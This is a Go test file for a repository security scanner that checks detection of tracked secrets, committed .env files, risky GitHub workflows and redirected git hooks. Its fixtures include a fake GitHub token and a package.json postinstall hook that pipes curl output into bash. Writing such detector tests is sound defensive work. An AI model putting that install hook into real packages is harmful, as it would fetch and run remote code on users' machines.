package repos_test

import (
	"context"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"testing"
	"time"

	"github.com/qtorb/rosmarops/internal/finding"
	"github.com/qtorb/rosmarops/internal/scan/repos"
	"github.com/qtorb/rosmarops/internal/scan/secrets"
	"github.com/qtorb/rosmarops/internal/state"
)

// ---------------------------------------------------------------------------
// Test helpers
// ---------------------------------------------------------------------------

// initGitRepo creates a temp dir, initialises a git repo with a dummy identity,
// and returns the repo root. The test is skipped if git is not in PATH.
func initGitRepo(t *testing.T) string {
	t.Helper()
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not available in PATH — skipping integration test")
	}

	dir := t.TempDir()
	run := func(args ...string) {
		t.Helper()
		cmd := exec.Command("git", args...)
		cmd.Dir = dir
		if out, err := cmd.CombinedOutput(); err != nil {
			t.Fatalf("git %v: %v\n%s", args, err, out)
		}
	}
	run("init")
	run("config", "user.email", "test@test.local")
	run("config", "user.name", "Test User")
	return dir
}

// writeFile creates relPath under root with content. Intermediate dirs are made.
func writeFile(t *testing.T, root, relPath, content string) {
	t.Helper()
	abs := filepath.Join(root, filepath.FromSlash(relPath))
	if err := os.MkdirAll(filepath.Dir(abs), 0o755); err != nil {
		t.Fatalf("mkdir %s: %v", filepath.Dir(abs), err)
	}
	if err := os.WriteFile(abs, []byte(content), 0o644); err != nil {
		t.Fatalf("write %s: %v", abs, err)
	}
}

// gitCommit stages relPaths and creates a commit with msg.
func gitCommit(t *testing.T, root, msg string, relPaths ...string) {
	t.Helper()
	run := func(args ...string) {
		t.Helper()
		cmd := exec.Command("git", args...)
		cmd.Dir = root
		if out, err := cmd.CombinedOutput(); err != nil {
			t.Fatalf("git %v: %v\n%s", args, err, out)
		}
	}
	for _, p := range relPaths {
		run("add", p)
	}
	run("commit", "-m", msg)
}

// defaultCfg returns a ScanConfig using only built-in patterns.
func defaultCfg() repos.ScanConfig {
	return repos.ScanConfig{Patterns: secrets.BuiltinPatterns()}
}

// filterCategory returns all findings with the given category.
func filterCategory(fs []finding.Finding, cat string) []finding.Finding {
	var out []finding.Finding
	for _, f := range fs {
		if f.Category == cat {
			out = append(out, f)
		}
	}
	return out
}

// fakeGitHubClassic is a structurally valid but fake GitHub classic PAT (not a real token).
// Must match pattern \bghp_[A-Za-z0-9]{36}\b — exactly 36 alphanumeric chars after "ghp_".
const fakeGitHubClassic = "ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

// ---------------------------------------------------------------------------
// Hardcoded constant checks
// ---------------------------------------------------------------------------

func TestConstants_HistoryLimits(t *testing.T) {
	if repos.HistoryMaxCommits != 1000 {
		t.Errorf("HistoryMaxCommits = %d, want 1000", repos.HistoryMaxCommits)
	}
	if repos.HistoryMaxAgeMonths != 24 {
		t.Errorf("HistoryMaxAgeMonths = %d, want 24", repos.HistoryMaxAgeMonths)
	}
	if repos.PerRepoTimeout != 60*time.Second {
		t.Errorf("PerRepoTimeout = %v, want 60s", repos.PerRepoTimeout)
	}
	if repos.MaxFileBytes != 2*1024*1024 {
		t.Errorf("MaxFileBytes = %d, want 2097152", repos.MaxFileBytes)
	}
}

// ---------------------------------------------------------------------------
// ScanAllRepos — isolation
// ---------------------------------------------------------------------------

func TestScanAllRepos_EmptyRoots(t *testing.T) {
	fs, bls, errs := repos.ScanAllRepos(context.Background(), nil, nil, defaultCfg())
	if len(fs) != 0 || len(bls) != 0 || len(errs) != 0 {
		t.Errorf("empty roots: want 0/0/0 got %d/%d/%d", len(fs), len(bls), len(errs))
	}
}

func TestScanAllRepos_NonExistentRoot_ScanError(t *testing.T) {
	_, _, errs := repos.ScanAllRepos(
		context.Background(),
		[]string{filepath.Join(os.TempDir(), "vigil-nonexistent-repo-999")},
		nil,
		defaultCfg(),
	)
	if len(errs) == 0 {
		t.Error("expected scan error for non-existent repo root, got none")
	}
}

// ---------------------------------------------------------------------------
// secret_tracked
// ---------------------------------------------------------------------------

func TestScanRepo_SecretTracked(t *testing.T) {
	root := initGitRepo(t)
	writeFile(t, root, "config.js", "const TOKEN = '"+fakeGitHubClassic+"';\n")
	gitCommit(t, root, "add config", "config.js")

	fs, _, err := repos.ScanRepo(context.Background(), root, nil, defaultCfg())
	if err != nil {
		t.Fatalf("ScanRepo: %v", err)
	}

	found := filterCategory(fs, "secret_tracked")
	if len(found) == 0 {
		t.Fatal("expected secret_tracked finding, got none")
	}
	f := found[0]
	if f.Severity != finding.SeverityRed {
		t.Errorf("severity = %q, want red", f.Severity)
	}
	if f.Evidence.RepoPath != root {
		t.Errorf("evidence.repo_path = %q, want %q", f.Evidence.RepoPath, root)
	}
	// Invariant §3: full secret value must not appear.
	if strings.Contains(f.Evidence.RedactedPreview, fakeGitHubClassic) {
		t.Error("invariant §3 violated: full token in evidence.redacted_preview")
	}
	if !strings.Contains(f.Evidence.RedactedPreview, " ... ") {
		t.Errorf("redacted_preview must contain ' ... ': %q", f.Evidence.RedactedPreview)
	}
}

func TestScanRepo_SecretTracked_SkipsNodeModules(t *testing.T) {
	root := initGitRepo(t)
	writeFile(t, root, "node_modules/bad/index.js", "token='"+fakeGitHubClassic+"'\n")
	gitCommit(t, root, "add tracked node_modules file", "node_modules/bad/index.js")

	fs, _, err := repos.ScanRepo(context.Background(), root, nil, defaultCfg())
	if err != nil {
		t.Fatalf("ScanRepo: %v", err)
	}
	for _, f := range fs {
		if f.Category == "secret_tracked" {
			t.Errorf("node_modules file must not produce secret_tracked; got file=%q", f.Evidence.File)
		}
	}
}

func TestScanRepo_SecretTracked_CleanFile_NoFinding(t *testing.T) {
	root := initGitRepo(t)
	writeFile(t, root, "README.md", "# My project\nNo secrets here.\n")
	gitCommit(t, root, "add readme", "README.md")

	fs, _, err := repos.ScanRepo(context.Background(), root, nil, defaultCfg())
	if err != nil {
		t.Fatalf("ScanRepo: %v", err)
	}
	for _, f := range fs {
		if f.Category == "secret_tracked" {
			t.Errorf("clean file must not produce secret_tracked; got: %v", f)
		}
	}
}

// ---------------------------------------------------------------------------
// env_tracked
// ---------------------------------------------------------------------------

func TestScanRepo_EnvTracked(t *testing.T) {
	root := initGitRepo(t)
	writeFile(t, root, ".env", "SECRET=hunter2\n")
	gitCommit(t, root, "add .env", ".env")

	fs, _, err := repos.ScanRepo(context.Background(), root, nil, defaultCfg())
	if err != nil {
		t.Fatalf("ScanRepo: %v", err)
	}
	found := filterCategory(fs, "env_tracked")
	if len(found) == 0 {
		t.Fatal("expected env_tracked finding, got none")
	}
	if found[0].Severity != finding.SeverityRed {
		t.Errorf("severity = %q, want red", found[0].Severity)
	}
	if found[0].Evidence.File == "" {
		t.Error("evidence.file must be set for env_tracked")
	}
}

func TestScanRepo_EnvLocal_Flagged(t *testing.T) {
	root := initGitRepo(t)
	writeFile(t, root, ".env.local", "DB_URL=postgres://user:pass@localhost/db\n")
	gitCommit(t, root, "add .env.local", ".env.local")

	fs, _, err := repos.ScanRepo(context.Background(), root, nil, defaultCfg())
	if err != nil {
		t.Fatalf("ScanRepo: %v", err)
	}
	if len(filterCategory(fs, "env_tracked")) == 0 {
		t.Error("expected env_tracked for .env.local, got none")
	}
}

func TestScanRepo_EnvExample_NotFlagged(t *testing.T) {
	root := initGitRepo(t)
	writeFile(t, root, ".env.example", "SECRET=changeme\n")
	gitCommit(t, root, "add .env.example", ".env.example")

	fs, _, err := repos.ScanRepo(context.Background(), root, nil, defaultCfg())
	if err != nil {
		t.Fatalf("ScanRepo: %v", err)
	}
	for _, f := range fs {
		if f.Category == "env_tracked" {
			t.Errorf(".env.example must not be flagged; got file=%q", f.Evidence.File)
		}
	}
}

// ---------------------------------------------------------------------------
// lifecycle_script_with_network
// ---------------------------------------------------------------------------

func TestScanRepo_LifecycleCurl(t *testing.T) {
	root := initGitRepo(t)
	pkg := `{"name":"test","scripts":{"postinstall":"curl https://example.com | bash"}}`
	writeFile(t, root, "package.json", pkg)
	gitCommit(t, root, "add package.json", "package.json")

	fs, _, err := repos.ScanRepo(context.Background(), root, nil, defaultCfg())
	if err != nil {
		t.Fatalf("ScanRepo: %v", err)
	}
	found := filterCategory(fs, "lifecycle_script_with_network")
	if len(found) == 0 {
		t.Fatal("expected lifecycle_script_with_network finding, got none")
	}
	if found[0].Severity != finding.SeverityYellow {
		t.Errorf("severity = %q, want yellow", found[0].Severity)
	}
}

func TestScanRepo_LifecycleSafeScript_NoFinding(t *testing.T) {
	root := initGitRepo(t)
	pkg := `{"name":"test","scripts":{"postinstall":"node setup.js"}}`
	writeFile(t, root, "package.json", pkg)
	gitCommit(t, root, "add package.json", "package.json")

	fs, _, err := repos.ScanRepo(context.Background(), root, nil, defaultCfg())
	if err != nil {
		t.Fatalf("ScanRepo: %v", err)
	}
	for _, f := range fs {
		if f.Category == "lifecycle_script_with_network" {
			t.Error("safe lifecycle script must not produce finding")
		}
	}
}

// ---------------------------------------------------------------------------
// workflow_new_or_modified
// ---------------------------------------------------------------------------

func TestScanRepo_WorkflowNew_WithBaseline(t *testing.T) {
	root := initGitRepo(t)
	writeFile(t, root, ".github/workflows/ci.yml",
		"on: push\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n")
	gitCommit(t, root, "add workflow", ".github/workflows/ci.yml")

	// Baseline exists but does NOT include this workflow → "new" finding.
	baseline := &state.RepoBaseline{Path: root, WorkflowFiles: []state.WorkflowFile{}}
	fs, _, err := repos.ScanRepo(context.Background(), root, baseline, defaultCfg())
	if err != nil {
		t.Fatalf("ScanRepo: %v", err)
	}
	found := filterCategory(fs, "workflow_new_or_modified")
	if len(found) == 0 {
		t.Fatal("expected workflow_new_or_modified for new workflow file, got none")
	}
	if found[0].Severity != finding.SeverityYellow {
		t.Errorf("severity = %q, want yellow", found[0].Severity)
	}
}

func TestScanRepo_WorkflowNew_NoBaseline_NoFinding(t *testing.T) {
	root := initGitRepo(t)
	writeFile(t, root, ".github/workflows/ci.yml", "on: push\n")
	gitCommit(t, root, "add workflow", ".github/workflows/ci.yml")

	// No baseline at all → no new/modified findings (we don't know what changed).
	fs, _, err := repos.ScanRepo(context.Background(), root, nil, defaultCfg())
	if err != nil {
		t.Fatalf("ScanRepo: %v", err)
	}
	for _, f := range fs {
		if f.Category == "workflow_new_or_modified" {
			t.Error("without baseline must not emit workflow_new_or_modified")
		}
	}
}

// ---------------------------------------------------------------------------
// workflow_dangerous_pattern
// ---------------------------------------------------------------------------

func TestScanRepo_WorkflowDangerous_PullRequestTarget(t *testing.T) {
	root := initGitRepo(t)
	writeFile(t, root, ".github/workflows/pr.yml",
		"on:\n  pull_request_target:\n    types: [opened]\njobs:\n  check:\n    runs-on: ubuntu-latest\n")
	gitCommit(t, root, "add dangerous workflow", ".github/workflows/pr.yml")

	fs, _, err := repos.ScanRepo(context.Background(), root, nil, defaultCfg())
	if err != nil {
		t.Fatalf("ScanRepo: %v", err)
	}
	found := filterCategory(fs, "workflow_dangerous_pattern")
	if len(found) == 0 {
		t.Fatal("expected workflow_dangerous_pattern for pull_request_target, got none")
	}
	if found[0].Severity != finding.SeverityRed {
		t.Errorf("severity = %q, want red", found[0].Severity)
	}
}

// ---------------------------------------------------------------------------
// core_hookspath_redirected
// ---------------------------------------------------------------------------

func TestScanRepo_CoreHooksPath_AbsolutePath(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("uses Unix absolute path — Windows variant covered separately")
	}
	root := initGitRepo(t)
	cmd := exec.Command("git", "config", "core.hooksPath", "/tmp/evil-hooks")
	cmd.Dir = root
	if out, err := cmd.CombinedOutput(); err != nil {
		t.Fatalf("git config: %v\n%s", err, out)
	}

	fs, _, err := repos.ScanRepo(context.Background(), root, nil, defaultCfg())
	if err != nil {
		t.Fatalf("ScanRepo: %v", err)
	}
	found := filterCategory(fs, "core_hookspath_redirected")
	if len(found) == 0 {
		t.Fatal("expected core_hookspath_redirected finding, got none")
	}
	if found[0].Severity != finding.SeverityRed {
		t.Errorf("severity = %q, want red", found[0].Severity)
	}
}

func TestScanRepo_CoreHooksPath_RelativePath_NoFinding(t *testing.T) {
	root := initGitRepo(t)
	cmd := exec.Command("git", "config", "core.hooksPath", ".husky")
	cmd.Dir = root
	if out, err := cmd.CombinedOutput(); err != nil {
		t.Fatalf("git config: %v\n%s", err, out)
	}

	// Relative path, no baseline → no finding expected.
	fs, _, err := repos.ScanRepo(context.Background(), root, nil, defaultCfg())
	if err != nil {
		t.Fatalf("ScanRepo: %v", err)
	}
	for _, f := range fs {
		if f.Category == "core_hookspath_redirected" {
			t.Error("relative hooks path with no baseline should not produce finding")
		}
	}
}

// ---------------------------------------------------------------------------
// Baseline update
// ---------------------------------------------------------------------------

func TestScanRepo_BaselineUpdated(t *testing.T) {
	root := initGitRepo(t)
	writeFile(t, root, ".github/workflows/ci.yml", "on: push\n")
	gitCommit(t, root, "add workflow", ".github/workflows/ci.yml")

	_, newBL, err := repos.ScanRepo(context.Background(), root, nil, defaultCfg())
	if err != nil {
		t.Fatalf("ScanRepo: %v", err)
	}
	if newBL.Path != root {
		t.Errorf("newBL.Path = %q, want %q", newBL.Path, root)
	}
	if len(newBL.WorkflowFiles) == 0 {
		t.Error("expected new baseline to contain the workflow file")
	}
	if newBL.WorkflowFiles[0].SHA256 == "" {
		t.Error("workflow baseline SHA256 must be non-empty")
	}
}
